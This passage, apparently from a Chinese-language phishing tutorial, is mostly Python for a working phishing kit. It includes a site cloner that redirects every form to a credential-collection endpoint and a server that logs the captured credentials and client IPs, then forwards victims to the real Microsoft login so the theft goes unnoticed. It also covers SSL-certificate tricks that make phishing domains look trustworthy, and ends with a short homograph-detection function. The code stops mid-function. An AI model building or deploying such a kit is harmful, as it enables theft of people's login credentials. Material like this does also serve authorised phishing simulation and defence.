```python
# 钓鱼网站克隆工具框架（仅用于授权测试）

import requests
from urllib.parse import urljoin, urlparse
import re

class WebsiteCloner:
    """网站克隆工具框架 - 仅用于授权安全评估"""

    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.base_domain = self.parsed_url.netloc
        self.cloned_html = ""
        self.assets = {}

    def fetch_page(self):
        """获取目标页面内容"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36'
            }
            response = requests.get(self.target_url, headers=headers,
                                   timeout=30, verify=True)
            return response.text
        except Exception as e:
            print(f"获取页面失败: {e}")
            return None

    def modify_forms(self, html):
        """修改表单提交地址为本地收集脚本"""
        # 替换所有表单的action属性
        # 将表单数据提交到本地收集脚本
        modified = re.sub(
            r'action=["\']([^"\']*)["\']',
            f'action="/submit_credentials"',
            html
        )
        return modified

    def rewrite_links(self, html):
        """重写资源链接为本地路径"""
        # 重写CSS/JS/图片链接
        # 确保克隆页面资源完整加载
        def replace_link(match):
            attr = match.group(1)
            url = match.group(2)
            if url.startswith('http'):
                return f'{attr}="{url}"'
            elif url.startswith('/'):
                return f'{attr}="{urljoin(self.target_url, url)}"'
            return match.group(0)

        pattern = r'(src|href)=["\']([^"\']*)["\']'
        return re.sub(pattern, replace_link, html)

    def inject_tracking(self, html):
        """注入跟踪脚本"""
        tracking_script = """
        <script>
        // 记录用户访问
        fetch('/track', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer
            })
        });
        </script>
        """
        # 在</body>前注入
        return html.replace('</body>', tracking_script + '</body>')

    def clone(self):
        """执行克隆"""
        html = self.fetch_page()
        if not html:
            return False

        html = self.modify_forms(html)
        html = self.rewrite_links(html)
        html = self.inject_tracking(html)

        self.cloned_html = html
        return True

    def save(self, filepath):
        """保存克隆的页面"""
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(self.cloned_html)

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class PhishingServer(BaseHTTPRequestHandler):
    """凭证收集服务器 - 仅用于授权测试"""

    def do_POST(self):
        """处理POST请求（凭证收集）"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # 记录提交的凭证
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'path': self.path,
            'data': post_data,
            'client_ip': self.client_address[0]
        }

        # 写入日志文件
        with open('captured_credentials.log', 'a') as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')

        # 重定向到真实网站（使钓鱼不易被察觉）
        self.send_response(302)
        self.send_header('Location', 'https://login.microsoftonline.com')
        self.end_headers()

    def do_GET(self):
        """处理GET请求（提供克隆页面）"""
        if self.path == '/' or self.path == '/login':

                with open('cloned_page.html', 'r', encoding='utf-8') as f:
```

### 2.2 SSL证书误导

```
SSL证书误导攻击手法：

1. 使用免费DV证书
   - 攻击者为钓鱼域名申请Let's Encrypt免费SSL证书
   - 钓鱼网站显示HTTPS和锁标志
   - 用户误以为HTTPS = 安全

2. 利用通配符证书
   - 攻击者获取*.attacker-domain.com的通配符证书
   - 创建 login.microsoft.com.attacker-domain.com
   - 该子域名受SSL证书保护

3. 证书名称混淆
   - 攻击者注册包含目标品牌名的域名
   - 如 company-login-secure.com
   - 获取该域名的SSL证书

4. 利用CDN的SSL
   - 攻击者使用Cloudflare等CDN服务
   - CDN提供SSL证书
   - 钓鱼网站获得CDN的IP信誉

防范：
- 教育用户：HTTPS不等于网站可信
- 域名注册监控（监控品牌相关域名注册）
- 证书透明度日志监控
- 使用EV证书（显示组织名称）
```

```python
# Punycode编码
# 浏览器将Unicode域名转换为Punycode
# аpple.com → xn--pple-43d.com
# 但某些浏览器或场景下仍显示Unicode

# 防御检测
import unicodedata

def detect_homograph(domain):
    """检测域名中可能的同形异义字攻击"""
    suspicious = []
    for i, char in enumerate(domain):
        char_name = unicodedata.name(char, 'UNKNOWN')
        # 检查是否包含非ASCII字符
        if ord(char) > 127:
            suspicious.append({
                'position': i,
                'character': char,
                'unicode_name': char_name,
                'codepoint': f'U+{ord(char):04X}'
            })

    if suspicious:
        return {
            'domain': domain,
            'is_suspicious': True,
            'findings': suspicious
        }
    return {'domain': domain, 'is_suspicious': False}
```
